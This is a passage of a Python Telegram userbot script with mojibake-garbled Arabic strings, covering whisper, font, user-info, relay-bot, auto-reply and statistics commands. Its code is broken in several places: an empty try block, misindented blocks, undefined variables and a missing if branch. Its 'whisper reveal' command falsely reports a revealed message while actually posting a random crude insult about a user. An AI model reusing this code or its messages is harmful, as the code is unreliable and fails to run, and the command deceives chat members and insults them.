    "** ŸÖÿßŸÑŸÉ ÿßŸÑŸÉÿ±Ÿàÿ® Ÿàÿßÿ≠ÿØ ÿ≤ÿ®ÿßŸÑŸá ŸàŸäÿØŸàÿ± ÿ®ŸÜÿßÿ™ **",
    "**ÿßŸàŸÑ ŸÖÿ±Ÿá ÿßÿ¥ŸàŸÅ ÿ®ŸÜÿßÿ™ ŸäÿØŸàÿ±ŸÜ ŸàŸÑÿØ üòÇ **",
    "**ÿ¥ŸàŸÅ Ÿáÿ∞ÿß ÿßŸÑŸÉÿ±ŸÜÿ¨ ÿØŸäŸÜ ŸÖÿ∂ÿßŸÑ ÿ®ÿ±ÿßÿ≥Ÿá**",
    "**ÿßŸÜÿ™Ÿá Ÿàÿßÿ≠ÿØ ŸÅÿ±ÿÆ Ÿàÿ™ŸÜŸäÿ¨**",
    "** ÿ±ÿßÿ≠ ÿßÿπÿ™ÿ±ŸÅŸÑŸÉ ÿ®ÿ¥Ÿä ÿ∑ŸÑÿπÿ™ ÿßÿ≠ÿ® ÿßÿÆÿ™ŸÉ ü•∫ **",
    "**ŸÖÿßŸÑŸÉ ÿßŸÑŸÉÿ±Ÿàÿ® ŸàÿßŸÑŸÖÿ¥ÿ±ŸÅŸäŸÜ ŸàŸÅÿ±ÿØŸá ŸÖŸÜ ŸÇŸÜÿØÿ±ÿ™ŸÉ ÿ∂ŸÑÿπŸä**",
    "**Ÿáÿ∞ÿß Ÿàÿßÿ≠ÿØ ÿ∫ÿ´Ÿäÿ´ ŸàŸÉŸÑÿ® ÿßÿ®ŸÜ ŸÉŸÑÿ®**",
    "**ŸÑÿ™ÿ≠ÿ¨Ÿä ŸÉÿØÿßŸÖŸá Ÿáÿ∞ÿß ŸÜÿ∫ŸÑ ŸäŸàÿµŸÑ ÿ≠ÿ¨Ÿä**",
    "**Ÿáÿ∞ÿß ÿßŸÑŸÖÿßŸÑŸÉ Ÿàÿßÿ≠ÿØ ÿ≥ÿßŸÇÿ∑ ŸàŸÇÿ±ÿßŸÖ ŸàŸäÿØŸàÿ± ÿ≠ŸÑŸàŸäŸÜ**",
    "**ŸÑŸà ÿ±ÿ®ŸÉ Ÿäÿ¨Ÿä ŸÖÿßÿ™ŸÜŸÉÿ¥ŸÅ ÿßŸÑŸáŸÖÿ≥Ÿá üòÇüòÇ**",
]

aljoker_enabled = True
hussein_enabled = True

async def get_user_from_event(event):
    if event.sender_id in (1087968824, 1036953733, 1062351279, 1067578920, 1067564781):
        return None
    if event.is_private:
        return await event.get_sender()
    if event.is_group:
        return await event.get_chat()
    return None

@client.on(events.NewMessage(pattern=".ŸáŸÖÿ≥Ÿá(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await get_user_from_event(event)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    Fa_rr_d = random.choice(rehu)
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**·ØΩÔ∏ôÿßŸÑŸáŸÖÿ≥ÿ© ŸÖŸÜ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ [{JoKeRUB}](tg://user?id={user.id}) ÿ™ŸÖ ŸÉÿ¥ŸÅŸáÿß ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**\n**·ØΩÔ∏ô ÿßŸÑŸáŸÖÿ≥ÿ© ŸáŸä : {Fa_rr_d} ** ")

@client.on(events.NewMessage(pattern="mark_as_read"))
async def mark_as_read(event):
    if aljoker_enabled:
        await event.mark_read()

@client.on(events.NewMessage(pattern="Hussein"))
async def Hussein(event):
    if hussein_enabled:
        await event.reply("Hussein")
var = {}

async def edit_delete(event, text):
    await event.edit(text)
    await asyncio.sleep(5)
    await event.delete()

@client.on(events.NewMessage(pattern="(ÿÆÿ∑ ÿßŸÑÿ∫ÿßŸÖŸÇ|ÿÆÿ∑ ÿ∫ÿßŸÖŸÇ|ÿÆÿ∑ ÿßŸÑŸÖÿ¥ÿ∑Ÿàÿ®|ÿÆÿ∑ ŸÖÿ¥ÿ∑Ÿàÿ®|ÿÆÿ∑ ÿ±ŸÖÿ≤|ÿÆÿ∑ ÿßŸÑÿ±ŸÖÿ≤|ÿÆÿ∑ ÿßŸÑÿ®ÿßŸäÿ´ŸàŸÜ|ÿÆÿ∑ ÿ®ÿßŸäÿ´ŸàŸÜ|ÿÆÿ∑ ÿßŸÑÿ®ÿ±ŸÜÿ™|ÿÆÿ∑ ÿ®ÿ±ŸÜÿ™)"))
async def change_font(event):
    font_types = {
        "ÿÆÿ∑ ÿßŸÑÿ∫ÿßŸÖŸÇ": "bold",
        "ÿÆÿ∑ ŸÖÿ¥ÿ∑Ÿàÿ®": "tshwesh",
        "ÿÆÿ∑ ÿ±ŸÖÿ≤": "ramz",
        "ÿÆÿ∑ ÿ®ÿßŸäÿ´ŸàŸÜ": "joker",
        "ÿÆÿ∑ ÿ®ÿ±ŸÜÿ™": "Brent",
    }
    font_type = font_types.get(event.pattern_match.group(1))
    if font_type:
        if var.get(font_type, None) == "on":
            var.pop(font_type)  
            await edit_delete(event, f"**·ØΩÔ∏ô ÿ™ŸÖ ÿßÿ∑ŸÅÿßÿ° {event.pattern_match.group(1)} ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì **")
        else:
            var[font_type] = "on"
            await edit_delete(event, f"**·ØΩÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ {event.pattern_match.group(1)} ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")

@client.on(events.NewMessage(outgoing=True))
async def reda(event):
    if event.message.text and not event.message.media and event.message.text.count(".") != 1 and event.message.text.count("@") != 1:
        font_types = {
            "bold": "**{}**",
            "tshwesh": "~~{}~~",
            "ramz": "`{}`",
            "joker": "```{}```",
             "Brent": '```print("{}")```'
  }
        for font_type, font_format in font_types.items():
            if var.get(font_type, None) == "on":
                try:
                    await event.edit(font_format.format(event.message.text))
                except MessageIdInvalidError:
                    pass
        
@client.on(events.NewMessage(pattern=r'\.(ÿßŸäÿØŸä|ÿß)$'))
async def show_user_id(event):
    try:
        await event.delete()  # ÿ≠ÿ∞ŸÅ ÿßŸÑÿ£ŸÖÿ±
        
        # ÿ™ÿ≠ÿØŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑŸÖÿ≥ÿ™ŸáÿØŸÅ
        try:
            reply = await event.get_reply_message()
            if reply:
                target = reply.sender_id
            else:
                target = event.sender_id
            
            user = await client.get_entity(target)
        except Exception as e:
            await event.reply("‚éô ŸÑŸÖ ÿ£ÿ™ŸÖŸÉŸÜ ŸÖŸÜ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ!")
            return
            
        # ÿ™ÿ¨ŸáŸäÿ≤ ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ£ÿ≥ÿßÿ≥Ÿäÿ©
        name = getattr(user, 'first_name', '')
        if getattr(user, 'last_name', None):
            name += " " + user.last_name
            
        # ÿ¨ŸÑÿ® ÿµŸàÿ±ÿ© ÿßŸÑŸÖŸÑŸÅ ÿßŸÑÿ¥ÿÆÿµŸä
        photo = None
        try:
            photo = await client.download_profile_photo(user.id, bytes)
        except:
            pass
            
        # ÿ™ÿßÿ±ŸäÿÆ ÿ¢ÿÆÿ± ÿ∏ŸáŸàÿ±
        last_seen = "ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ"
        if hasattr(user, 'status'):
            if user.status and hasattr(user.status, 'was_online'):
                last_seen = user.status.was_online.strftime("%Y-%m-%d %H:%M")
        
        # ÿπŸÑÿßŸÖÿ© ÿßŸÑÿ™ÿ≠ŸÇŸÇ
        verified = "‚úì" if getattr(user, 'verified', False) else "‚úó"
        
        # ÿ™ÿ≠ÿ∂Ÿäÿ± ÿßŸÑŸÜÿµ
        info_text = (
            f"**‚éô ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ **\n\n"
            f"**ÿßŸÑÿßÿ≥ŸÖ:** {name or 'ÿ∫Ÿäÿ± ŸÖÿ™ŸàŸÅÿ±'}\n"
            f"**ÿßŸÑÿ£ŸäÿØŸä:** `{getattr(user, 'id', 'ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ')}`\n"
            f"**ÿßŸÑŸäŸàÿ≤ÿ±:** @{user.username}\n" if getattr(user, 'username', None) else "**ÿßŸÑŸäŸàÿ≤ÿ±:** ŸÑÿß ŸäŸàÿ¨ÿØ\n"
            f"**ÿ≠ÿ≥ÿßÿ® ŸÖŸàÿ´ŸàŸÇ:** {verified}\n"
            f"**ÿ¢ÿÆÿ± ÿ∏ŸáŸàÿ±:** {last_seen}\n\n"
            f"‚è± {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        )
        
        # ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÜÿ™Ÿäÿ¨ÿ©
        try:
            if photo:
                await client.send_file(
                    event.chat_id,
                    photo,
                    caption=info_text,
                    buttons=[[KeyboardButtonUrl("ÿ±ÿßÿ®ÿ∑ ÿßŸÑÿ≠ÿ≥ÿßÿ®", f"tg://user?id={user.id}")]]
                )
            else:
                await event.reply(
                    info_text,
                    buttons=[[KeyboardButtonUrl("ÿ±ÿßÿ®ÿ∑ ÿßŸÑÿ≠ÿ≥ÿßÿ®", f"tg://user?id={user.id}")]]
                )
        except Exception as e:
            await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™: {str(e)}")
                             
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")


@client.on(events.NewMessage(outgoing=True, pattern='\.ŸäŸàŸàŸàŸàÿ™ (.+)'))
async def tconv(event):
    chat = await event.get_chat()
    sentence_to_summarize = event.pattern_match.group(1)
    if sentence_to_summarize.startswith("."):
        sentence_to_summarize = sentence_to_summarize[1:].strip()
    sentence_to_summarize = "ŸäŸàÿ™ " + sentence_to_summarize
    await event.edit("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿßŸÜÿ™ÿ∏ÿßÿ±...")
    try:
            audio_clip = None
            timeout = 15
            start_time = asyncio.get_event_loop().time()
            while asyncio.get_event_loop().time() - start_time < timeout:
                response = await conv.get_response(x.id)
                await client.send_read_acknowledge(conv.chat_id)
                if "ÿπŸÑŸäŸÉ ÿßŸÑÿ£ÿ¥ÿ™ÿ±ÿßŸÉ ŸÅŸä ŸÇŸÜÿßÿ© ÿßŸÑÿ®Ÿàÿ™" in response.message:
                    try:
                        channel_name = re.search(r"ŸÇŸÜÿßÿ© ÿßŸÑÿ®Ÿàÿ™ : (@\w+)", response.message).group(1)
                        await client(JoinChannelRequest(channel_name))
                    except Exception as e:
                        print(f"ÿÆÿ∑ÿ£: {e}")
                if response.audio:
                    audio_clip = response
                    break
            if audio_clip:
                new_message = Message(
                    id=0,
                    peer_id=chat,
                    message="",
                    media=audio_clip.media,
                    entities=None,
                    reply_markup=None,
                    ttl_period=None
                )
                await client.send_message(chat, new_message, silent=True)
                await event.delete()
                await asyncio.sleep(0)  
                try:
                except MessageIdInvalidError:
                    print("ÿÆÿ∑ÿ£: ŸÑÿß ŸäŸÖŸÉŸÜ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©")
            else:
                await event.edit("ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ")
    except Exception as e:
        print(f"ÿÆÿ∑ÿ£: {e}")
        await event.edit("ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿπŸÖŸÑŸäÿ©")

@client.on(events.NewMessage(outgoing=True, pattern='\.ÿ≥ŸàÿßŸÑ (.*)'))
async def tco(event):
    chat = await event.get_chat()
    question = event.pattern_match.group(1)
    await event.edit("ÿ¨ÿßÿ±Ÿç ÿ¨ŸÖÿπ ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÜÿ™ÿ∏ÿ± 7 ÿ´ŸàÿßŸÜ ...")

    async with client.conversation('@SAMI_PAI_BOT') as conv:
        await conv.send_message(question)

        await asyncio.sleep(7)

        
        response1 = await conv.get_response()
        response2 = await conv.get_response()

        
        if response1.text == "‚åõÔ∏è Forming a response ...":
            xx = response2  
        else:
            xx = response1  

        text_without_links = re.sub(r'http\S+', '', xx.text)

        await client.send_read_acknowledge(conv.chat_id)
        await client.send_message(chat, text_without_links)
        await event.message.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ÿ≠ŸÖŸÑ (.+)'))
async def download_media(event):
    chat = await event.get_chat()
    link = event.pattern_match.group(1)
    message_to_delete = await event.edit("ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸÖŸäŸÑ...")

        try:
            await conv.send_message(link)

            async def handle_response(event):
                if event.media:
                    if event.grouped_id:
                        for photo in event.media.photos:
                            await client.send_file(chat, photo)
                    else:
                        await client.send_file(chat, event.media)

                    
                    await message_to_delete.delete()

                    
                    await asyncio.sleep(3)

                    try:
                        await client(functions.messages.DeleteHistoryRequest(
                            max_id=event.message.id,
                            revoke=True
                        ))
                    except Exception as e:
                        print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")

                client.remove_event_handler(handle_response)

            try:
                await asyncio.wait_for(
                    client.loop.create_task(conv.get_response()),
                    timeout=10
                )
            except asyncio.TimeoutError:
                await event.edit("ÿßÿ≥ŸÅ ŸäÿßÿµÿØŸäŸÇŸä ŸÑŸÖ ÿßÿ¨ÿØ ÿ¥Ÿäÿ¶ÿß")
                client.remove_event_handler(handle_response)

        except Exception as e:
            print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")
            await event.edit(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")



import pickle
import asyncio
from telethon import events

afk_mode = False   
custom_reply = "ÿ£ŸÜÿß ŸÑÿ≥ÿ™ ŸÖŸàÿ¨ŸàÿØŸãÿß ÿßŸÑÿ¢ŸÜÿå ÿ£ÿ±ÿ¨ŸàŸÉ ÿßÿ™ÿ±ŸÉ ÿ±ÿ≥ÿßŸÑÿ™ŸÉ ŸàÿßŸÜÿ™ÿ∏ÿ± ŸÑÿ≠ŸäŸÜ ÿπŸàÿØÿ™Ÿä."
reply_to_message = None
custom_replies = {}  
custom_replies_enabled = False  
allowed_chats = set()

try:
    with open('custom_replies.pickle', 'rb') as f:
        custom_replies = pickle.load(f)
except FileNotFoundError:
    pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿØ$'))
async def enable_afk(event):
    global afk_mode
    afk_mode = True
    await event.edit("ÿ™ŸÖ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿßŸÑŸÖÿÆÿµÿµ ÿ™ÿ¥ÿ∫ŸäŸÑ$'))
async def enable_custom_replies(event):
    global custom_replies_enabled
    custom_replies_enabled = True
    await event.edit("ÿ™ŸÖ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿÆÿµÿµÿ©.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ±ÿØ$'))
async def disable_replies(event):
    global afk_mode, custom_replies_enabled
    afk_mode = False
    custom_replies_enabled = False
    await event.edit("ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ±ÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ŸàÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿÆÿµÿµÿ©.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ±ÿØ$'))
async def set_reply_template(event):
    global reply_to_message
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        await event.edit(f"ÿ™ŸÖ ÿ™ÿπŸäŸäŸÜ ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ±ÿØ ÿ•ŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≠ÿØÿØÿ©.")
    else:
        await event.edit("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™Ÿä ÿ™ÿ±ŸäÿØ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸáÿß ŸÉŸÉŸÑŸäÿ¥ÿ©.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ±ÿØ (.*)'))
async def add_custom_reply(event):
    global custom_replies
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        trigger_text = reply_to_message.raw_text
        reply_text = event.pattern_match.group(1).strip()
        if len(custom_replies) < 20:
            custom_replies[trigger_text] = reply_text
            with open('custom_replies.pickle', 'wb') as f:
                pickle.dump(custom_replies, f)
            await event.edit(f"ÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ÿßŸÑŸÖÿÆÿµÿµ ÿ®ŸÜÿ¨ÿßÿ≠. ŸÑÿØŸäŸÉ ÿßŸÑÿ¢ŸÜ {len(custom_replies)} ÿ±ÿØŸàÿØ ŸÖÿÆÿµÿµÿ©.")
        else:
            await event.edit("ŸÑŸÇÿØ ŸàÿµŸÑÿ™ ÿ•ŸÑŸâ ÿßŸÑÿ≠ÿØ ÿßŸÑÿ£ŸÇÿµŸâ ŸÑŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿÆÿµÿµÿ© (20).")
    else:
        await event.edit("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™Ÿä ÿ™ÿ±ŸäÿØ ÿ•ÿ∂ÿßŸÅÿ© ÿ±ÿØ ŸÖÿÆÿµÿµ ŸÑŸáÿß.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ≠ÿ∞ŸÅ ÿ±ÿØ$'))
async def delete_custom_reply(event):
    global custom_replies
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        trigger_text = reply_to_message.raw_text
        if trigger_text in custom_replies:
            del custom_replies[trigger_text]
            with open('custom_replies.pickle', 'wb') as f:
                pickle.dump(custom_replies, f)
            await event.edit("ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ±ÿØ ÿßŸÑŸÖÿÆÿµÿµ ÿ®ŸÜÿ¨ÿßÿ≠.")
        else:
            await event.edit("ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿ±ÿØ ŸÖÿÆÿµÿµ ŸÑŸáÿ∞Ÿá ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©.")
    else:
        await event.edit("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™Ÿä ÿ™ÿ±ŸäÿØ ÿ≠ÿ∞ŸÅ ÿ±ÿØŸáÿß ÿßŸÑŸÖÿÆÿµÿµ.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage)
async def reply_handler(event):
    global afk_mode, custom_replies, custom_replies_enabled
    if (afk_mode or custom_replies_enabled) and event.is_private:
        me = await event.client.get_me()
        sender = await event.get_sender()
            if custom_replies_enabled:
                for trigger, reply in custom_replies.items():
                    if trigger in event.raw_text:  
                        await event.reply(reply)
                        break  
            if afk_mode:  
                if not event.raw_text in custom_replies:  
                    if reply_to_message:
                        await event.reply(reply_to_message)
                    else:
                        await event.reply(custom_reply)

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ≥ŸÖÿßÿ≠$'))
async def allow_chat(event):
    if event.is_private:
        allowed_chats.add(event.chat_id)
        await event.edit("ÿ™ŸÖ ÿßŸÑÿ≥ŸÖÿßÿ≠ ŸÑŸáÿ∞Ÿá ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿ©.")
    else:
        await event.edit("ŸÑÿß ŸäŸÖŸÉŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ÿ•ŸÑÿß ŸÅŸä ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿßÿ™ ÿßŸÑÿÆÿßÿµÿ©.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ≥ŸÖÿßÿ≠$'))
async def disallow_chat(event):
    if event.is_private:
        allowed_chats.discard(event.chat_id)
        await event.edit("ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ÿßŸÑÿ≥ŸÖÿßÿ≠ ŸÑŸáÿ∞Ÿá ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿ©.")
    else:
        await event.edit("ŸÑÿß ŸäŸÖŸÉŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ÿ•ŸÑÿß ŸÅŸä ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿßÿ™ ÿßŸÑÿÆÿßÿµÿ©.")
    await asyncio.sleep(2)
    await event.delete()



last_reply_sent = None

@client.on(events.NewMessage)
async def reply_handler(event):
    global afk_mode, custom_replies, custom_replies_enabled, last_reply_sent
    if (afk_mode or custom_replies_enabled) and event.is_private and event.chat_id not in allowed_chats:
        me = await event.client.get_me()
        sender = await event.get_sender()
            if custom_replies_enabled:
                for trigger, reply in custom_replies.items():
                    if trigger in event.raw_text:
                        await event.reply(reply)
                        break
            if afk_mode:
                if not event.raw_text in custom_replies:
                    if reply_to_message:
                        reply_text = reply_to_message.text
                        reply = await event.reply(reply_to_message)
                        if last_reply_sent and last_reply_sent.text == reply_text:
                            await last_reply_sent.delete()
                        last_reply_sent = reply
                    else:
                        reply = await event.reply(custom_reply)
                        if last_reply_sent and last_reply_sent.text == custom_reply:
                            await last_reply_sent.delete()
                        last_reply_sent = reply

STAT_INDICATION = f"**‚éâ‚ïéÿ¨ŸÄÿßÿ±Ÿê ÿ¨ŸÄŸÑÿ® ÿßŸÑÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ•ŸÜÿ™ÿ∏ŸÄÿ± ‚Öè . . .**"
CHANNELS_STR = f"ìÜ© **[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó](t.me/source_flex)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÇŸÜŸÄŸàÿßÿ™** ìÜ™\n\n"
CHANNELS_ADMINSTR = f"ìÜ© **[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó](t.me/source_flex)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÇŸÜŸÄŸàÿßÿ™ ÿßÿ¥ŸÄÿ±ÿßŸÅ** ìÜ™\n\n"
CHANNELS_OWNERSTR = f"ìÜ© **[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó](t.me/source_flex)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÇŸÜŸÄŸàÿßÿ™ ŸÖŸÑŸÉŸäŸÄÿ©** ìÜ™\n\n"
GROUPS_STR = f"ìÜ© **[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó](t.me/source_flex)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÖÿ¨ŸÖŸÄŸàÿπŸÄÿßÿ™** ìÜ™\n\n"
GROUPS_ADMINSTR = f"ìÜ© **[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó](t.me/source_flex)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÖÿ¨ŸÖŸÄŸàÿπŸÄÿßÿ™ ÿßÿ¥ŸÄÿ±ÿßŸÅ** ìÜ™\n\n"
GROUPS_OWNERSTR = f"ìÜ© **[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó](t.me/source_flex)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÖÿ¨ŸÖŸÄŸàÿπŸÄÿßÿ™ ŸÖŸÑŸÉŸäŸÄÿ©** ìÜ™\n\n"

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿßÿ≠ÿµÿßÿ¶Ÿäÿßÿ™Ÿä"))
async def count(event):
    start_time = time.time()
    u = 0
    g = 0
    c = 0
    bc = 0
    b = 0
    result = ""
    await event.edit("**‚™º ÿ¨ÿßÿ±Ÿä ÿßŸÑŸÖÿπŸÄÿßŸÑÿ¨Ÿá ‡ºó.**")
    dialogs = await client.get_dialogs(limit=None, ignore_migrated=True)
    for d in dialogs:
        current_entity = d.entity
        if isinstance(current_entity, User):
                b += 1
            else:
                u += 1
        elif isinstance(current_entity, Chat):
            g += 1
        elif isinstance(current_entity, Channel):
            if current_entity.broadcast:
                bc += 1
            else:
                c += 1
        else:
            print(d)
    result += f"ŸÄìÜ© ·ØìùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿßŸÑÿ≠ÿ≥ŸÄÿßÿ®** ìÜ™\n"
    result += f"ìçπ‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µßìçª\n"
    result += f"**‚éâ‚ïéÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖŸàŸÜ :**\t**{u}**\n"
    result += f"**‚éâ‚ïéÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ :**\t**{g}**\n"
    result += f"**‚éâ‚ïéÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿÆÿßÿ±ŸÇŸá :**\t**{c}**\n"
    result += f"**‚éâ‚ïéÿßŸÑŸÇŸÜŸàÿßÿ™ :**\t**{bc}**\n"
    result += f"**‚éâ‚ïéÿßŸÑÿ®Ÿàÿ™ÿßÿ™ :**\t**{b}**\n"
    result += f"ŸÄìçπ‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µßìçª"
    stop_time = time.time() - start_time
    result += f"\n**- ÿßŸÑŸàŸÇŸÄÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿ∫ŸÄÿ±ŸÇ üìü :** {stop_time:.02f} **ÿ´ŸÄÿßŸÜŸäŸÄŸá**"
    await event.edit(result)
   

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ŸÖÿπŸÑŸàŸÖÿßÿ™Ÿä"))
async def stats(event):
    "To get statistics of your telegram account."
    cat = await event.edit("**‚™º ÿ¨ÿßÿ±Ÿä ÿßŸÑŸÖÿπŸÄÿßŸÑÿ¨Ÿá ‡ºó.**...")
    start_time = time.time()
    private_chats = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0

    def inline_mention(user):
        return f"[{user.first_name}](tg://user?id={user.id})"

    dialog: Dialog
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
            if entity.creator:
                creator_in_channels += 1
        elif (isinstance(entity, Channel) and entity.megagroup or
              not isinstance(entity, Channel) and not isinstance(entity, User) and isinstance(entity, Chat)):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
            if entity.creator:
                creator_in_groups += 1
        elif not isinstance(entity, Channel) and isinstance(entity, User):
            private_chats += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count

    stop_time = time.time() - start_time
    full_name = inline_mention(await event.client.get_me())
